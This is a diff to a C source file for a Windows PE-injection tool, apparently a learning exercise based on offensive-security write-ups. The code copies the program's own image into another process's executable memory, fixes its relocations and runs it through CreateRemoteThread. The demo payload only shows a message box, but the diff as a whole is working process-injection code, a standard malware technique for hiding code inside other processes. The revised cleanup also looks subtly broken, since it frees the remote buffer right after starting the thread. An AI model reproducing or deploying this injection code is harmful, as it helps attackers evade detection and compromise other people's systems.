@@ -4,10 +4,10 @@
 // https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes
 // https://www.cnblogs.com/LyShark/p/17684114.html
 
-VOID Dumbo(VOID)
+PVOID Dumbo(VOID)
 {
 	MessageBoxA(NULL, "PE Injection Successful!", "Hijack Me", MB_OK);
-	return;
+	return NULL;
 }
 
 BOOL GetRemoteProcID
@@ -28,7 +28,7 @@ BOOL GetRemoteProcID
 
 	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
 	if (pNtQuerySystemInformation == NULL) {
-		printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
+		PRINT_ERROR("GetProcAddress");
 		return FALSE;
 	}
 
@@ -37,7 +37,7 @@ BOOL GetRemoteProcID
 	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
 	if (SystemProcInfo == NULL)
 	{
-		printf("[!] HeapAlloc Failed!\n");
+		PRINT_ERROR("HeapAlloc");
 		return FALSE;
 	}
 
@@ -45,7 +45,7 @@ BOOL GetRemoteProcID
 
 	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
 	if (STATUS != 0x0) {
-		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
+		PRINT_ERROR("NtQuerySystemInformation");
 		return FALSE;
 	}
 
@@ -88,14 +88,14 @@ BOOL GrabPeHeader
 	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
 	{
 		PRINT_ERROR("Magic Letters");
-		return;
+		return FALSE;
 	}
 
 	PIMAGE_NT_HEADERS pImgNt64 = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);
 	if (pImgNt64->Signature != IMAGE_NT_SIGNATURE)
 	{
 		PRINT_ERROR("Nt Signature");
-		return;
+		return FALSE;
 	}
 
 	PIMAGE_OPTIONAL_HEADER pImgOpt = &pImgNt64->OptionalHeader;
@@ -108,61 +108,23 @@ BOOL GrabPeHeader
 	*pImgSecHeader = pImgSecHead;
 	*pImgDataDir = pImgDataDir64;
 
+	return TRUE;
+
 }
 
-BOOL PEInject
+BOOL fixReloc
 (
-	IN PIMAGE_SECTION_HEADER pImgSecHeader,
-	IN PIMAGE_DATA_DIRECTORY pImgDataDir,
-	IN PIMAGE_NT_HEADERS pImgNt,
-	IN HANDLE hProcess
+	IN DWORD RelocRVA,
+	IN PVOID localBuffer,
+	IN DWORD_PTR dwDelta
 )
 {
 
-	HANDLE hThread;
-	PVOID localBuffer, remoteBuffer;
-	SIZE_T lpNumOfBytesWritten;
-
-	PVOID pBase = GetModuleHandle(NULL);
-	DWORD pImageBase = pImgNt->OptionalHeader.ImageBase;
-
-	if ((localBuffer = VirtualAlloc(NULL, pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL)
-	{
-		PRINT_ERROR("VirtualAlloc");
+	if (!localBuffer || RelocRVA == 0)
 		return FALSE;
-	}
-
-	INFO("[0x%p] Local Buffer Address", localBuffer);
-
-	memcpy(localBuffer, pBase, pImgNt->OptionalHeader.SizeOfImage);
-
-	if ((remoteBuffer = VirtualAllocEx(hProcess, NULL, pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
-	{
-		PRINT_ERROR("VirtualAllocEx");
-		return FALSE;
-	 }
-
-	LPVOID RemoteBase = remoteBuffer;
-
-	INFO("[0x%p] Remote Buffer Address", RemoteBase);
-
-	DWORD_PTR dwDelta = (DWORD_PTR)RemoteBase - (DWORD_PTR)pImageBase;
-
-	printf(
-		"[v] [0x%p] Source Image Base\n"
-		"[v] [0x%p] Dest Image Base\n"
-		"[v] [0x%p] Relocation Delta\n",
-		pImageBase,
-		RemoteBase,
-		dwDelta
-	);
-
-	DWORD RelocRVA = pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
 
 	PIMAGE_BASE_RELOCATION Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)localBuffer + RelocRVA);
 	PBASE_RELOCATION_ENTRY relocationRVA = NULL;
-
-	INFO("ImageBase: 0x%08X | RelocRVA: 0x%08X | Reloc: 0x%08X", pImageBase, RelocRVA, Reloc);
 
 	while (Reloc->SizeOfBlock)
 	{
@@ -182,24 +144,93 @@ BOOL PEInject
 		Reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)Reloc + Reloc->SizeOfBlock);
 	}
 
+	return TRUE;
+
+}
+
+BOOL PEInject
+(
+	IN PIMAGE_SECTION_HEADER pImgSecHeader,
+	IN PIMAGE_DATA_DIRECTORY pImgDataDir,
+	IN PIMAGE_NT_HEADERS pImgNt,
+	IN HANDLE hProcess
+)
+{
+	BOOL State = TRUE;
+	PVOID localBuffer, remoteBuffer;
+	SIZE_T lpNumOfBytesWritten;
+
+	PVOID pBase = GetModuleHandle(NULL);
+	DWORD pImageBase = pImgNt->OptionalHeader.ImageBase;
+	DWORD_PTR DumboOffset = ((DWORD_PTR)Dumbo - (DWORD_PTR)pBase);
+
+	if ((localBuffer = VirtualAlloc(NULL, pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL)
+	{
+		PRINT_ERROR("VirtualAlloc");
+		State = FALSE; goto CLEANUP;
+	}
+
+	INFO("[0x%p] Local Buffer Address", localBuffer);
+
+	memcpy(localBuffer, pBase, pImgNt->OptionalHeader.SizeOfImage);
+
+	if ((remoteBuffer = VirtualAllocEx(hProcess, NULL, pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
+	{
+		PRINT_ERROR("VirtualAllocEx");
+		State = FALSE; goto CLEANUP;
+	}
+
+	LPVOID RemoteBase = remoteBuffer;
+
+	INFO("[0x%p] Remote Buffer Address", RemoteBase);
+
+	DWORD_PTR dwDelta = (DWORD_PTR)RemoteBase - (DWORD_PTR)pImageBase;
+
+	printf(
+		"[v] [0x%p] Source Image Base\n"
+		"[v] [0x%p] Dest Image Base\n"
+		"[v] [0x%p] Relocation Delta\n",
+		pImageBase,
+		RemoteBase,
+		dwDelta
+	);
+
+	DWORD RelocRVA = pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
+
+	if (!fixReloc(RelocRVA, localBuffer, dwDelta))
+	{
+		PRINT_ERROR("fixReloc");
+		State = FALSE; goto CLEANUP;
+	}
+
 	if (!WriteProcessMemory(hProcess, RemoteBase, localBuffer, pImgNt->OptionalHeader.SizeOfImage, &lpNumOfBytesWritten))
 	{
 		PRINT_ERROR("WriteProcessMemory");
-		return FALSE;
+		State = FALSE; goto CLEANUP;
 	}
 
 	INFO("Wrote Process Memory --> [0x%p] With Size --> [%d]", RemoteBase, pImgNt->OptionalHeader.SizeOfHeaders);
 
-	if (!CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Dumbo, NULL, 0, NULL))
+	PVOID DumboAddress = (PVOID)((DWORD_PTR)RemoteBase + DumboOffset);
+
+	if (!CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)DumboAddress, NULL, 0, NULL))
 	{
 		PRINT_ERROR("CreateRemoteThread");
-		return FALSE;
+		State = FALSE; goto CLEANUP;
 	}
 
-	INFO("CreatedRemoteThread");
+	INFO("Created Remote Thread");
 
 	OKAY("DONE!");
 
-	return TRUE;
+CLEANUP:
+
+	if (localBuffer)
+		VirtualFree(localBuffer, 0, MEM_RELEASE);
+
+	if (remoteBuffer)
+		VirtualFree(remoteBuffer, 0, MEM_RELEASE);
+
+	return State;
 
 }
